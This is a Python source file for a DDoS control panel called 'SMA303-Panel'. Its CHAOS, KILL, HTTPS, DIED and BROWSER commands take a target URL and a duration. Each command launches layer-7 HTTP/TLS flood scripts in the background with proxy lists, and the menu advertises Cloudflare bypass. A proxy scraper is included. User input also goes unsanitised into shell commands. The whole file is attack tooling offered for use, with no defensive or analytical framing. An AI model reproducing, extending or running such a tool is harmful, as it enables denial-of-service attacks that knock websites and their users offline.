# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def menu():
  print('''
\x1b[0m [\x1b[38;2;205;6;844mCLEAR\x1b[0m]  : CLEAR THE TERMINAL
\x1b[0m [\x1b[38;2;196;8;844mSCRAPE\x1b[0m] : PROXY SCRAPER 
\x1b[0m [\x1b[38;2;160;15;845mLAYER7\x1b[0m] : SHOW LAYER7 METHODS
''')

def layer7():
    print("""
\x1b[0m [\x1b[38;2;205;6;844mC\x1b[38;2;196;8;844mH\x1b[38;2;169;13;846mA\x1b[38;2;160;15;845mO\x1b[0m\x1b[38;2;205;6;844mS\x1b[0m]   : Bypass any cf site and high request
\x1b[0m [\x1b[38;2;205;6;844mK\x1b[38;2;196;8;844mI\x1b[38;2;160;15;845mL\x1b[0m\x1b[38;2;205;6;844mL\x1b[0m]    : Flood design with TLS connection
\x1b[0m [\x1b[38;2;205;6;844mH\x1b[38;2;196;8;844mT\x1b[38;2;169;13;846mT\x1b[38;2;160;15;845mP\x1b[0m\x1b[38;2;205;6;844mS\x1b[0m]   : Flood design with HTTPS/1.2 Bypass
\x1b[0m [\x1b[38;2;196;8;844mD\x1b[38;2;169;13;846mI\x1b[38;2;160;15;845mE\x1b[0m\x1b[38;2;205;6;844mD\x1b[0m]    : High request and bypass
\x1b[0m [\x1b[38;2;160;15;845mB\x1b[38;2;205;6;844mR\x1b[38;2;196;8;844mO\x1b[38;2;169;13;846mW\x1b[38;2;160;15;845mS\x1b[0m\x1b[38;2;205;6;844mE\x1b[38;2;205;6;844mR\x1b[0m] : Design for any site with high rps
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[36m
\x1b[38;2;214;4;844m                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⣲⠟⠁⠀⠀⠀⠀⠀  ⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;205;6;844m                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠖⠋⢀⠞⠁⠀ ⠀⠀⠀  ⠀⢀⠜⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;196;8;844m                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠊⠀⠀⡠⠋⠀⠀⠀⠀⠀ ⠀  ⣠⠊⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;169;13;846m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⡜⠁⠀⠀⠀⠀⠀⠀⠀ ⣀⠤⠚⠁⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;169;13;846m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⠀⠀⠀⠀⢀⣀⣀⠤⠖⠈⠀⠀⢀⡜⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
\x1b[38;2;160;15;845m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠓⠲⢤⣸⠒⣊⣭⠛⠉⠀⠀⠀⠀⠀⢀⣠⢿⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;160;15;845m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⣹⠎⠀⠀⠑⡄⠀⢀⡠⠔⢊⡥⢺⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;151;16;845m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠎⠀⠀⠀⣠⠞⠁⠀⠀⠀⢀⣾⠋⠁⣠⠞⠁⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;143;18;846m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⡠⠊⡜⠁⠀⠀⠀⢀⡊⠁⠁⠀⢊⡀⠀⠀⠀⣀⣉⣓⣦⡤⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;134;20;846m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡤⠊⠁⠸⠀⠀⠀⡠⡖⡝⠀⠀⠀⠀⠀⠈⢉⡩⠭⠒⢋⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;98;27;847m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⠀⠑⠒⠛⠒⠋⠁⠀⠀⠀⠀⠀⠀⠘⠤⣀⡀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;89;28;847m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠜⠁⠀⠀⠀⠀⠀⠀⢀⣀⠤⠄⠀⠀⠀⡰⠚⢧⠉⠒⠒⠮⠽⣾⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;72;32;848m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠁⡠⣖⠂⠀⠀⠀⡠⠋⠉⠀⡀⠀⠀⢀⡴⠁⠀⠸⡄⠀⠀⠀⠀⡇⠙⢌⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;63;34;848m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠘⠐⠁⣀⡠⠔⠋⣀⣀⡴⠚⠓⡶⣞⣉⣀⣀⡠⢤⠇⠀⠀⠀⢰⣃⡀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;67;36;848m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣀⣠⡊⠁⡀⣠⠞⠁⠀⠀⠀⡜⠁⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⣿⠀⠈⠑⢄⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;65;38;848m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣽⢻⡏⠁⠀⠀⠀⢀⠞⠑⠦⠤⠤⠤⠄⡸⠁⠀⠀⠀⢸⠉⣆⠀⠀⠘⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;62;40;848m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠀⠃⠀⠀⠀⢀⢏⠀⠀⠀⠀⠀⠀⡰⠁⠀⠀⠀⠀⢸⠀⠘⡄⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

\x1b[0m                 ⠀⠀⠀⠀TYPE [\x1b[38;2;205;6;844mH\x1b[38;2;196;8;844mE\x1b[38;2;169;13;846mL\x1b[38;2;160;15;845mP\x1b[0m] TO SEE OUR COMMANDS LIST
\033[0m""")

    while True:
        sys.stdout.write(f"\x1b]2;[\] SMA303-Panel :: Online Users: [∞] :: Attack Sended: [∞] :: Expired: [∞]\x07")
        sin = input(" "+Back.WHITE+Fore.RED+" SMA303 ● Panel "+Fore.RESET+Back.RESET+" ►► ")
        sinput = sin.split(" ")[0]
        if sinput == "reset" or sinput == "RESET":
            os.system ("python3 main.py")
        if sinput == "clear" or sinput == "CLEAR":
            os.system ("clear")
            main()
        if sinput == "help" or sinput == "HELP":
            menu()
        if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
            layer7()
      
        elif sinput == "scrape" or sinput == "SCRAPE":
                os.system(f'cd L7 && python3 scrape.py')
                main()

#########LAYER-7########  
        elif sinput == "CHAOS":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd L7 && screen -dm node http-fuku.js {url} {time} 64 5 proxy.txt')
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} CHAOS {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "KILL" or sinput == "kill":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd L7 && screen -dm node hold.js {url} {time} 64 5 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} KILL {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()
            
        elif sinput == "HTTPS" or sinput == "https":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd L7 && screen -dm node http-fuku.js {url} {time} 64 5 proxy.txt')
                os.system(f'cd L7 && screen -dm node browser.js {url} {time} 5 64 proxy.txt')
                os.system(f'cd L7 && screen -dm node hold.js {url} {time} 64 5 proxy.txt')
                os.system(f'cd L7 && screen -dm go run httpflood.go {url} 5 get {time} header.txt')
                os.system(f'cd L7 && screen -dm go run scota.go --host {url} -time {time}s')
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} HTTPS {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "DIED" or sinput == "died":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd L7 && screen -dm go run httpflood.go {url} 5 get {time} header.txt')
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} DIED {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "BROWSER" or sinput == "browser":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd L7 && screen -dm go run scota.go --host {url} -time {time}s')
                os.system ("clear")
                print(f"""
\x1b[38;2;214;4;844m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔═╗╔╗╔╔╦╗
\x1b[38;2;169;13;846m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ╚═╗║╣ ║║║ ║
\x1b[38;2;134;20;846m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ╚═╝╚═╝╝╚╝ ╩
\x1b[0m                            ATTACK HAS BEEN STARTED!
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TARGET   : [{Fore.GREEN} {url} {Fore.RESET}]
                   TIME     : [{Fore.GREEN} {time} {Fore.RESET}]
                   METHODS  : [{Fore.GREEN} BROWSER {Fore.RESET}]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
""")
            except ValueError:
                main()
            except IndexError:
                main()                    

main()